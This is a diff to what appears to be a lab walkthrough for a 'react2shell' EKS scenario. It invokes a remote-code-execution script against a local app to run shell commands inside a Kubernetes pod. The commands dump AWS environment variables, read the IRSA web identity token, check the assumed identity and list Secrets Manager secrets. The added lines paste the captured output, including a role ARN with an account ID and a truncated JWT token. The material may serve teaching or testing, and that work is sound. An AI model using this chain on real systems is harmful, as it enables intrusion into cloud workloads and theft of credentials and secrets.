@@ -76,10 +76,19 @@ python scripts/rce.py http://localhost:3000 "id"
 
 # 2. detect IRSA — pod has an AWS identity
 python scripts/rce.py http://localhost:3000 "env | grep AWS"
+# AWS_ROLE_ARN=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa
+# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
+# AWS_STS_REGIONAL_ENDPOINTS=regional
+# AWS_DEFAULT_REGION=ca-central-1
+# AWS_REGION=ca-central-1
+
 python scripts/rce.py http://localhost:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
+executable response:
+# eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...
 
 # 3. assume role — SDK auto-uses IRSA
 python scripts/rce.py http://localhost:3000 "aws sts get-caller-identity"
+# /bin/sh: 1: aws: not found
 
 # 4. enumerate reach — broad role lists secrets
 python scripts/rce.py http://localhost:3000 "aws secretsmanager list-secrets --region ca-central-1"
